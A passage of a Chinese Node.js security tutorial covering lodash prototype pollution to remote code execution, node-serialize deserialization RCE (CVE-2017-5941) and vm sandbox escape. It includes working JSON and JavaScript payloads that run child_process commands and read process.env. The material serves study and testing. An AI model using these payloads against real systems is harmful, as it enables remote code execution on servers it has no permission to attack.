<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()
app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>({<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>})).<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'/static'</span>, express.<span class="hljs-title function_">static</span>(<span class="hljs-string">'static'</span>))
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>({
    <span class="hljs-attr">name</span>: <span class="hljs-string">'thejs.session'</span>,
    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">'aA0'</span>, <span class="hljs-number">16</span>),
    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>
}))

app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">'ejs'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) { <span class="hljs-comment">// define the template engine</span>
    fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err))
        <span class="hljs-keyword">let</span> compiled = lodash.<span class="hljs-title function_">template</span>(content)
        <span class="hljs-keyword">let</span> rendered = <span class="hljs-title function_">compiled</span>({...options})
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, rendered)
    })
})
app.<span class="hljs-title function_">set</span>(<span class="hljs-string">'views'</span>, <span class="hljs-string">'./views'</span>)
app.<span class="hljs-title function_">set</span>(<span class="hljs-string">'view engine'</span>, <span class="hljs-string">'ejs'</span>)

app.<span class="hljs-title function_">all</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    <span class="hljs-comment">// 定义session</span>
    <span class="hljs-keyword">let</span> data = req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> || {<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []}
    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">'POST'</span>) {
        <span class="hljs-comment">// 获取post数据并合并</span>
        data = lodash.<span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)
        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data
        <span class="hljs-comment">// 再将data赋值给session</span>
    }
    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">'index'</span>, {
        <span class="hljs-attr">language</span>: data.<span class="hljs-property">language</span>, 
        <span class="hljs-attr">category</span>: data.<span class="hljs-property">category</span>
    })
})

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Example app listening on port 3000!'</span>))</code></pre>
<p>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p>
<p>页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030190941582.png" alt="image-20231030190941582"></p>
<p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">'sourceURL'</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">'//# sourceURL='</span> + options.<span class="hljs-property">sourceURL</span> + <span class="hljs-string">'\n'</span> : <span class="hljs-string">''</span>;</code></pre>
<p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p>
<p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030191055545.png" alt="image-20231030191055545"></p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">'return '</span> + source)
      .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);
  });</code></pre>
<p>通过构造chile_process.exec()就可以执行任意代码了。</p>
<p>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p>
<pre><code class="hljs js">{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"sourceURL"</span>:<span class="hljs-string">"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"</span>}}</code></pre>
<p>(这里直接用require会报错：ReferenceError: require is not defined</p>
<p>p神给了一个更好的payload：</p>
<pre><code class="hljs js">{<span class="hljs-string">"__proto__"</span>:{<span class="hljs-string">"sourceURL"</span>:<span class="hljs-string">"\nreturn e=&gt; {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')}\n//"</span>}}</code></pre>
<p>下面跟着佬过一遍CVE漏洞，有时间下去复现。</p>
<h2 id="53-node-serialize反序列化rce漏洞cve-2017-5941">5.3 node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2>
<p>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</p>
<ul>
<li>了解什么是IIFE：</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
<p>IIFE一般写成下面的形式：</p>
<pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){ <span class="hljs-comment">/* code */</span> }());
<span class="hljs-comment">// 或者</span>
(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){ <span class="hljs-comment">/* code */</span> })();</code></pre>
<ul>
<li><code>node-serialize@0.0.4</code>漏洞点</li>
</ul>
<p>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030193224104.png" alt="image-20231030193224104"></p>
<p>其中的关键就是：<code>obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p>
<ul>
<li>构造Payload</li>
</ul>
<pre><code class="hljs js">serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">'node-serialize'</span>);
<span class="hljs-keyword">var</span> test = {
 rce : <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'ls /'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>){<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stdout)});},
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"序列化生成的 Payload: \n"</span> + serialize.<span class="hljs-title function_">serialize</span>(test));</code></pre>
<p>生成的Payload为：</p>
<pre><code class="hljs js">{<span class="hljs-string">"rce"</span>:<span class="hljs-string">"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}"</span>}</code></pre>
<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
<pre><code class="hljs js">{<span class="hljs-string">"rce"</span>:<span class="hljs-string">"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}()"</span>}</code></pre>
<p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p>
<p>传递给unserialize(注意转义单引号)：</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">'node-serialize'</span>);
<span class="hljs-keyword">var</span> payload = <span class="hljs-string">'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr){console.log(stdout)});}()"}'</span>;
serialize.<span class="hljs-title function_">unserialize</span>(payload);</code></pre>
<p>执行命令成功，结果如图：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030193404903.png" alt="image-20231030193404903"></p>
<h1 id="0x06-vm沙箱逃逸">0x06 vm沙箱逃逸</h1>
<h2 id="61-沙箱逃逸初识">6.1 沙箱逃逸初识</h2>
<p>说到沙箱逃逸，我们先来明确一些基本的概念。</p>
<ul>
<li>JavaScript和Nodejs之间有什么区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言，写在后端（服务端）的JavaScript就叫做Nodejs。</li>
<li>什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li>
<li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</li>
<li>在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</li>
</ul>
<h2 id="62-node将字符串执行为代码">6.2 Node将字符串执行为代码</h2>
<p>我们先来看两个在node中将把字符串执行成代码的方式。</p>
<p><strong>方法一 eval</strong></p>
<p>首先我在目录下创建一个age.txt</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span></code></pre>
<p>创建一个y1.js</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>)

<span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'age.txt'</span>, <span class="hljs-string">'utf-8'</span>)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)

<span class="hljs-built_in">eval</span>(content)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201003485.png" alt="image-20231030201003485"></p>
<p>可以发现我们通过eval执行了一个字符串，但是这种执行方式如果在当前作用域下已经有了同名的age变量，这个程序就会报错。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201015450.png" alt="image-20231030201015450"></p>
<p>在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题，我们再看另外一种方法。</p>
<p><strong>方法二：new Function</strong></p>
<p>上面的方法因为模块间的作用域被限制了使用，那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢？new Function的第一个参数是形参名称，第二个参数是函数体。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201152813.png" alt="image-20231030201152813"></p>
<p>我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。</p>
<p>从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个<strong>能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域</strong>，这也就是vm模块的作用。</p>
<h2 id="63-nodejs作用域">6.3 Nodejs作用域</h2>
<p>说到作用域，我们就要说一下Nodejs中的作用域是怎么分配的（在Nodejs中一般把作用域叫上下文）。</p>
<p>在Web端（浏览器），发挥作用的一般是JavaScript，学过JavaScript的师傅应该都知道我们打开浏览器的窗口是JavaScript中最大的对象<code>window</code>，那么在服务端发挥作用的Nodejs它的构造和JavaScript不太一样。</p>
<p>我们在写一个Nodejs项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中require了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数，举个例子。</p>
<p>在同一级目录下有<code>y1.js</code>和<code>y2.js</code>两个文件</p>
<pre><code class="hljs js">y1.<span class="hljs-property">js</span>
<span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>
y2.<span class="hljs-property">js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./y1"</span>)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)</code></pre>
<p>运行y2.js发现报错 <code>age</code> 值为undefined</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201511642.png" alt="image-20231030201511642"></p>
<p>那么我们想y2中引入并使用y1中的元素应该怎么办呢，Nodejs给我们提供了一个将js文件中元素输出的接口<code>exports</code> ，把y1修改成下面这样：</p>
<pre><code class="hljs js">y1.<span class="hljs-property">js</span>
<span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>

<span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = age</code></pre>
<p>我们再运行y2就可以拿到age的值了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201547409.png" alt="image-20231030201547409"></p>
<p>我们用图来解释这两个包之间的关系就是</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201659774.png" alt="image-20231030201659774"></p>
<p>这个时候就有人会问左上角的global是什么？这里就要说到Nodejs中的全局对象了。</p>
<p>刚才我们提到在JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）。</p>
<p>我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：</p>
<pre><code class="hljs js">y1.<span class="hljs-property">js</span>
<span class="hljs-variable language_">global</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>
y2.<span class="hljs-property">js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./y1"</span>)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)</code></pre>
<p>输出：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030201715932.png" alt="image-20231030201715932"></p>
<p>可以发现我这次在y1中并没有使用<code>exports</code>将age导入，并且y2在输出时也没有用<code>a.age</code>，因为此时age已经挂载在global上了，它的作用域已经不在y1中了。</p>
<p>我们输出一下global对象，可以看到age确实挂载在了global上：</p>
<pre><code class="hljs javascript">&lt;ref *<span class="hljs-number">1</span>&gt; <span class="hljs-title class_">Object</span> [<span class="hljs-variable language_">global</span>] {
  <span class="hljs-attr">global</span>: [<span class="hljs-title class_">Circular</span> *<span class="hljs-number">1</span>],
  <span class="hljs-attr">clearInterval</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">clearInterval</span>],
  <span class="hljs-attr">clearTimeout</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">clearTimeout</span>],
  <span class="hljs-attr">setInterval</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">setInterval</span>],
  <span class="hljs-attr">setTimeout</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">setTimeout</span>] {
    [<span class="hljs-title class_">Symbol</span>(nodejs.<span class="hljs-property">util</span>.<span class="hljs-property">promisify</span>.<span class="hljs-property">custom</span>)]: [<span class="hljs-title class_">Getter</span>]
  },
  <span class="hljs-attr">queueMicrotask</span>: [<span class="hljs-title class_">Function</span>: queueMicrotask],
  <span class="hljs-attr">performance</span>: <span class="hljs-title class_">Performance</span> {
    <span class="hljs-attr">nodeTiming</span>: <span class="hljs-title class_">PerformanceNodeTiming</span> {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'node'</span>,
      <span class="hljs-attr">entryType</span>: <span class="hljs-string">'node'</span>,
      <span class="hljs-attr">startTime</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">duration</span>: <span class="hljs-number">25.98190000653267</span>,
      <span class="hljs-attr">nodeStart</span>: <span class="hljs-number">0.4919999986886978</span>,
      <span class="hljs-attr">v8Start</span>: <span class="hljs-number">2.0012000054121017</span>,
      <span class="hljs-attr">bootstrapComplete</span>: <span class="hljs-number">18.864999994635582</span>,
      <span class="hljs-attr">environment</span>: <span class="hljs-number">10.277099996805191</span>,
      <span class="hljs-attr">loopStart</span>: -<span class="hljs-number">1</span>,
      <span class="hljs-attr">loopExit</span>: -<span class="hljs-number">1</span>,
      <span class="hljs-attr">idleTime</span>: <span class="hljs-number">0</span>
    },
    <span class="hljs-attr">timeOrigin</span>: <span class="hljs-number">1665558311872.296</span>
  },
  <span class="hljs-attr">clearImmediate</span>: [<span class="hljs-title class_">Function</span>: clearImmediate],
  <span class="hljs-attr">setImmediate</span>: [<span class="hljs-title class_">Function</span>: setImmediate] {
    [<span class="hljs-title class_">Symbol</span>(nodejs.<span class="hljs-property">util</span>.<span class="hljs-property">promisify</span>.<span class="hljs-property">custom</span>)]: [<span class="hljs-title class_">Getter</span>]
  },
  <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>
}</code></pre>
<h2 id="64-vm沙箱逃逸">6.4 vm沙箱逃逸</h2>
<p>我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。</p>
<ul>
<li><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030202109219.png" alt="image-20231030202109219"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">let</span> localVar = <span class="hljs-string">'initial value'</span>;
<span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">'localVar = "vm";'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'vmResult:'</span>, vmResult);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'localVar:'</span>, localVar);
<span class="hljs-comment">// vmResult: 'vm', localVar: 'initial value'</span></code></pre>
<ul>
<li><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</li>
<li><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030204648215.png" alt="image-20231030204648215"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
  <span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
  <span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;
  <span class="hljs-keyword">const</span> sandbox = { <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> };
  vm.<span class="hljs-title function_">createContext</span>(sandbox);
  vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">'globalVar *= 2;'</span>, sandbox);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// { globalVar: 2 }</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span></code></pre>
<ul>
<li>
<p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p>
</li>
<li>
<p><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p>
</li>
<li>
<p><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br>
code：要被解析的JavaScript代码</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> sandbox = {
<span class="hljs-attr">animal</span>: <span class="hljs-string">'cat'</span>,
<span class="hljs-attr">count</span>: <span class="hljs-number">2</span>
};
<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">'count += 1; name = "kitty";'</span>);
<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
script.<span class="hljs-title function_">runInContext</span>(context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));
<span class="hljs-comment">// { animal: 'cat', count: 3, name: 'kitty' }</span></code></pre>
<p>script对象可以通过runInXXXContext运行。</p>
</li>
</ul>
<p>我们一般进行沙箱逃逸最后都是进行rce，那么在Nodejs里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p>
<p>如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：</p>
<pre><code class="hljs js"><span class="hljs-meta">"use strict"</span>;
<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);
<span class="hljs-keyword">const</span> y1 = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor('return process.env')()`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y1);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030205253645.png" alt="image-20231030205253645"></p>
<pre><code class="hljs js">vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor('return process.env')()`</span>);</code></pre>
<p>那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p>
